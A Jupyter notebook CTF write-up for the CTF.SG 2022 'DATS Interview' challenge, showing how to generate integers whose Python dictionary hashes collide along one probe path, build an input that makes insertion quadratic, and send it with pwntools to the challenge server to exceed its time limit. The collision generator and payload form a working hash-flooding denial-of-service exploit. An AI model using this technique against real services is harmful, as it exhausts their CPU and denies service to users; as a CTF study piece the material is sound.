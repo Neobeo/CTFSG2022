{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# DATS Interview\n",
    "\n",
    "Unfortunately, I did not solve this live during the CTF.SG competition. There were unintended solutions that involve the server not checking for negative values, but since we don't have the server code I did not explore these, and assumed that the specifications given on the PDF were golden.\n",
    "\n",
    "The code that is used to solve the Stone Statues problem looks simple enough, and I think I managed to convince myself that it is logically sound and does not produce incorrect answers. In that case, the vulnerability must be in the 10-second limit, but I wasn't entirely sure how to make it slow enough.\n",
    "\n",
    "The intended solution path mentioned after the hunt ended was about the dictionary hash, and in hindsight this is actually kind of obvious, so this write-up is an attempt to solve it as such. \n",
    "\n",
    "The idea is that it takes linear time to add `n` elements into a dictionary, but only if we expect the hashes to be well-behaved. In the worst case where every element turns out to have the same hash, then we'd need quadratic time, since each insertion would first need to check that none of the previous elements (that have the same hash) are in fact the same element.\n",
    "\n",
    "The strategy python dictionaries use to resolve hash collisions is called [Open addressing](https://en.wikipedia.org/wiki/Open_addressing), and in particular here's a great explanation of [how python dictionaries work](https://tenthousandmeters.com/blog/python-behind-the-scenes-10-how-python-dictionaries-work/), or better yet [an explorable explanation](https://just-taking-a-ride.com/inside_python_dict/chapter4.html).\n",
    "\n",
    "---\n",
    "\n",
    "So first things first, can we actually have 100000 elements resolving to the same hash? It turns out that hashing an integer is just taking it mod $2^{61}-1$, so because of the `long long` limit we can only have 8-9 elements for any given hash.\n",
    "\n",
    "We know to due the 2/3-load factor that a dictionary with 100000 elements must have a table size of $2^{18}=262144$, so that any two integers differing by a multiple of 262144 must end up in the same initial bucket. However, because their hash is not identical, these upper bits of the hash are use to make them probe into different trajectories. What we want to do is force these different hashes to eventually resolve to the same trajectory.\n",
    "\n",
    "Fortunately we can have 8 copies of each hash, so that for each hash we have 8 \"attempts\" to get it into a trajectory of interest. For example, consider the starting value 47933, which will have the following trajectory:\n",
    "![47933](dats47933.png)\n",
    "\n",
    "The red arrows here means that it's perturbed, and subsequently after the first three reds the hash will hash shifted enough to reach no perturbation, so that it ends up in the same trajectory as zero. The important point here, is that in this example you need at least four copies of the hash for it to do something substantial here: the first three are simply dummies. In general, since we can make 8 copies of each hash, we can allow for seven perturbations. All-in-all, this means that we have a runtime of $O\\left(\\left(\\frac{n}{8}\\right)^2\\right)$, which is quadratic.\n",
    "\n",
    "All that remains is to find 12500 such hashes that enter the zero trajectory within 7 steps. We will just brute force over a big enough range and collect all such candidates. We use `numba.jit` to speed things up."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([                  0,               17906,               27009, ...,\n",
       "                2244121148,          2244406662, 2305843009213693951],\n",
       "      dtype=uint64)"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from numba import jit\n",
    "import numpy as np\n",
    "\n",
    "@jit(nopython=True)\n",
    "def find_collisions_to_zero():\n",
    "    result = np.empty(12501, 'uint64')\n",
    "    result[12500] = 2**61 - 1\n",
    "    \n",
    "    count = 0\n",
    "    for hash_value in range(2**32):\n",
    "        mask = 2**18 - 1\n",
    "        perturb = hash_value\n",
    "        probe = hash_value & mask\n",
    "        for i in range(7):\n",
    "            perturb >>= 5\n",
    "            if perturb == 0 and probe == 0:\n",
    "                result[count] = hash_value\n",
    "                count += 1\n",
    "                if count == 12500:\n",
    "                    return result\n",
    "                break\n",
    "            probe = (probe * 5 + perturb + 1) & mask\n",
    "\n",
    "collisions = find_collisions_to_zero()\n",
    "collisions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Success! We have managed to find 12500 such values. Now we just need to turn it back into the form required by the question."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'17906 9103 20924 17906 71291 89614 47933 25342 81361 47933 8253 138864 47933 89614 47933 23358 47933'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = ' '.join(map(str, list(np.diff(collisions)) * 8))\n",
    "payload[:100]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We only show the first 100 characters above, but basically we take a diff between consecutive values to represent Salokin statues, and at the end we make it jump to $2^{61}-1$. Then we make eight copies of the whole thing. Anyway, let's make our own approximation of how fast we think tennek can run this."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CPU times: user 20.5 s, sys: 157 µs, total: 20.5 s\n",
      "Wall time: 20.5 s\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "100001"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%time len({i:0 for i in np.cumsum([0]+list(map(int,payload.split())), dtype='uint64')})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sounds good. All that's left to do is just feed it in and get the flag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to chals.ctf.sg on port 20401\n",
      "[x] Opening connection to chals.ctf.sg on port 20401: Trying 178.128.20.61\n",
      "[+] Opening connection to chals.ctf.sg on port 20401: Done\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 19B\n",
      "[x] Receiving all data: 57B\n",
      "[x] Receiving all data: 65B\n",
      "[x] Receiving all data: 124B\n",
      "[x] Receiving all data: 187B\n",
      "[x] Receiving all data: 188B\n",
      "[x] Receiving all data: 225B\n",
      "[x] Receiving all data: 259B\n",
      "[+] Receiving all data: Done (259B)\n",
      "[*] Closed connection to chals.ctf.sg port 20401\n",
      "b\"1st line of input: 2nd line of input: 3rd line of input: Answer: Verifying answer correctness... This might take a while...\\nOK, answer is verified correct, running on Tennek's code now...\\nTime limit exceeded! Congratulations!\\nCTFSG{Uncompetitive_Programming}\\n\"\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "import numpy as np\n",
    "\n",
    "sh = remote('chals.ctf.sg', 20401)\n",
    "sh.recvuntil(b'case...\\n')\n",
    "sh.sendline(b'100000')\n",
    "sh.sendline(b'2')\n",
    "sh.sendline(payload.encode())\n",
    "sh.sendline(b'-1 -1')\n",
    "sh.recvall()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
